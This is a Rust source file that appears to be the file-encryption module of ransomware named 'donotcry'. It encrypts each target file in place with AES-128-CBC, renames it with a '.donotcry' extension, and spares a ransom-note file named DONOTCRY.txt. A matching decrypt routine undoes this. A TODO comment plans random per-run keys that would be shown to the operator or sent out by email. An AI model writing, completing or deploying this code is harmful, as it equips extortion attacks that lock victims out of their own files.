use colored::Colorize;
use libaes::Cipher;
use std::fs;

pub fn encrypt(filename: &str) {
    // TODO: generate randomly key and iv on encrypt, then show it or send an email. when decrypting ask for it.
    let key = b"fTjWmZq4t7w!z%C*";
    let iv = b"+MbQeThWmZq4t6w9";

    let cipher = Cipher::new_128(key);

    if !filename.contains("DONOTCRY.txt") {
        let msg = format!("[*] Encrypting {}", filename);
        println!("{}", msg.green());

        let encrypted = cipher.cbc_encrypt(iv, &fs::read(filename).unwrap());
        fs::write(filename, encrypted).unwrap();
        let new_filename = format!("{}.donotcry", filename);
        fs::rename(filename, new_filename).unwrap();
    }
}

pub fn decrypt(filename: &str) {
    let key = b"fTjWmZq4t7w!z%C*";
    let iv = b"+MbQeThWmZq4t6w9";

    let cipher = Cipher::new_128(key);

    if !filename.contains("DONOTCRY.txt") {
        let msg = format!("[*] Decrypting {}", filename);
        println!("{}", msg.green());

        let decrypted = cipher.cbc_decrypt(iv, &fs::read(filename).unwrap());
        fs::write(filename, decrypted).unwrap();
        let new_filename = filename.replace(".donotcry", "");
        fs::rename(filename, new_filename).unwrap();
    }
}
